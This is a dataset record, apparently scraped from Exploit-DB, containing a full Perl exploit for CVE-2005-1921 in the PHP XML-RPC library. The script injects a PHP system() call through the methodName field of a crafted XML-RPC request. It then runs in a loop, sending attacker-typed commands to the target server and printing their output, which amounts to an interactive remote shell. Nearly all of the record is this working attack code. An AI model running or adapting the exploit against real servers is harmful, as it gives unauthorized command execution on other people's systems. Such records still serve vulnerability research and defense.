{
  "id": "1084",
  "title": "XML-RPC Library 1.3.0 - &#039;xmlrpc.php&#039; Remote Command Execution (3)",
  "cve": "CVE-2005-1921",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl -w\r\n# ********************************************************\r\n# XML-RPC Remote Command Execution Exploit By Mike Rifone\r\n# ********************************************************\r\n# This works on da phpxmlrpc, and da PEAR XML_RPC too! All\r\n# you need is to put the url to the server and u get shell\r\n# Dis is my first exploit but hey it works :D ~Mike@Rifone\r\n# ********************************************************\r\n\r\nuse LWP::UserAgent;\r\n\r\n$brws = new LWP::UserAgent;\r\n$brws->agent(\"Internet Explorer 6.0\");\r\n\r\n$host = $ARGV[0]; \r\n\r\nif ( !$host ) \r\n{ \r\n\tdie(\"Usage: xmlrpcexec.pl http://pathto/xmlrpcserver\"); \r\n}\r\n\r\nwhile ( $host ) \r\n{\r\n\r\n\tprint \"xmlrpc\\@\\#\";\r\n\t\r\n\t$exec = <STDIN>;\t\r\n\t$data = \"<?xml version=\\\"1.0\\\"?><methodCall><methodName>foo.bar</methodName><params><param><value><string>1</string></value></param><param><value><string>1</string></value></param><param><value><string>1</string></value></param><param><value><string>1</string></value></param><param><value><name>','')); system('$exec'); die; /*</name></value></param></params></methodCall>\";\r\n\t\r\n\t$send = new HTTP::Request POST => $host;\r\n\t$send->content($data);\r\n\t$gots = $brws->request($send);\t\r\n\t$show = $gots->content;\r\n\t\r\n\tif ( $show =~ /<b>([\\d]{1,10})<\\/b><br \\/>(.*)/is )\r\n\t{\r\n\t    print $2 . \"\\n\";\r\n\t}\r\n\telse\r\n\t{\r\n\t\tprint \"$show\\n\";\r\n\t}\r\n\r\n\r\n}\r\n\r\n# milw0rm.com [2005-07-04]",
  "url": "https://www.exploit-db.com/exploits/1084"
}